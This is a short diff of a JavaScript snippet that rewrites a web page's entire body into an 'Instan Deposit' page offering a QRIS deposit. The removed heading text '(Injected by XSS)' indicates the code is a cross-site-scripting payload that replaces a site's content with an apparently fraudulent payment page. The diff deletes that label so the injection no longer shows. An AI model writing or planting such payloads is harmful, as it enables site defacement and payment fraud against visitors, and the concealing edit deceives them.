@@ -1,7 +1,7 @@
 // Buat ulang struktur HTML dari JavaScript
 document.body.innerHTML = `
   <div class="bg-white shadow-2xl rounded-2xl w-full max-w-xl p-8 space-y-8" style="margin:auto;margin-top:30px">
-    <h1 class="text-3xl font-bold text-center text-indigo-700 mb-4">Instan Deposit (Injected by XSS)</h1>
+    <h1 class="text-3xl font-bold text-center text-indigo-700 mb-4">Instan Deposit</h1>
     <!-- QRIS Deposit -->
     <div class="p-4 bg-indigo-50 rounded-xl shadow">
       <h2 class="text-xl font-semibold mb-2 text-indigo-600">Deposit via QRIS</h2>
